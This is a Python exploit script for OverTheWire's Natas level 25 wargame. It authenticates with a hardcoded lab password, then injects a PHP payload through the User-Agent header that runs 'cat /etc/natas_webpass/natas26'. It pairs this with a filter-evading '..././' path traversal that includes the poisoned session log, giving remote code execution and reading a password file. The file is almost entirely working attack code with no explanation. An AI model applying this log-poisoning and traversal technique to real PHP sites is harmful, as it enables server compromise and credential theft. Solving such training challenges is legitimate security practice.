import requests
from string import *


username = "natas25"
password = "ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws"
url = f"http://{username}.natas.labs.overthewire.org/"
url2 =""
#../../etc/natas_webpass/natas25
pw = ""
session = requests.Session()
response = session.get(url, auth=(username, password))
sessionid = session.cookies.get("PHPSESSID")
print("session id:", sessionid)
response = session.post(url, auth=(username, password), headers={"User-Agent": f"<?php system('cat /etc/natas_webpass/natas26') ?>"}, data={"lang": f"..././..././..././..././..././var/www/natas/natas25/logs/natas25_{sessionid}.log"})
print(response.text)
print("Status code:", response.status_code)
